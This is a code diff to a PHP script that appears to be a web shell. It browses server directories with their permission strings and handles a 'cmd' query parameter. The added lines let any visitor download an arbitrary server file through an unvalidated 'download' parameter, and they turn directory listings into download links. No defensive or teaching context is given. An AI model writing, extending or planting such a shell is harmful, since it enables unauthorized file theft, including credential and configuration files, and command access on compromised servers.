@@ -1,3 +1,22 @@
+<?php
+
+if (isset($_GET['download'])) {
+	$file = $_GET['download'];
+	if (file_exists($file)) {
+	    header('Content-Description: File Transfer');
+	    header('Content-Type: application/octet-stream');
+	    header('Content-Disposition: attachment; filename="'.basename($file).'"');
+	    header('Expires: 0');
+	    header('Cache-Control: must-revalidate');
+	    header('Pragma: public');
+	    header('Content-Length: ' . filesize($file));
+	    readfile($file);
+	    exit;
+	}
+}
+
+?>
+
 <html>
 
 <?php
@@ -30,10 +49,16 @@ function printPerms($file) {
 	$s.=sprintf("%1s%1s%1s", $world['read'], $world['write'], $world['execute']);
 	return $s;
 }
- 
+
 
 $dir = $_GET['dir'];
+$file = '';
 if ($dir == NULL or !is_dir($dir)) {
+	if (is_file($dir)) {
+		echo "enters";
+		$file = $dir;
+		echo $file;
+	}
 	$dir = './';
 }
 $dir = realpath($dir.'/'.$value);
@@ -41,7 +66,12 @@ $dir = realpath($dir.'/'.$value);
 $dirs = scandir($dir);
 echo "Viewing directory " . $dir . "<br><br>";
 foreach ($dirs as $key => $value) {
-	echo "<a href='". $_SERVER['PHP_SELF'] . "?dir=". realpath($dir.'/'.$value) . "/'>". $value . "</a> " . printPerms($dir) . "\n<br>";
+	if (is_dir(realpath($dir.'/'.$value))) {
+		echo "<a href='". $_SERVER['PHP_SELF'] . "?dir=". realpath($dir.'/'.$value) . "/'>". $value . "</a> " . printPerms($dir) . "\n<br>";
+	}
+	else {
+		echo "<a href='". $_SERVER['PHP_SELF'] . "?download=". realpath($dir.'/'.$value) . "'>". $value . "</a> " . printPerms($dir) . "\n<br>";
+	}
 }
 
 echo "\n<br><form action='".$_SERVER['PHP_SELF']."' method='GET'>";
@@ -56,6 +86,8 @@ if (isset($_GET['cmd'])) {
 		echo "$value \n<br>";
 	}
 }
+
+
 
 ?>
 
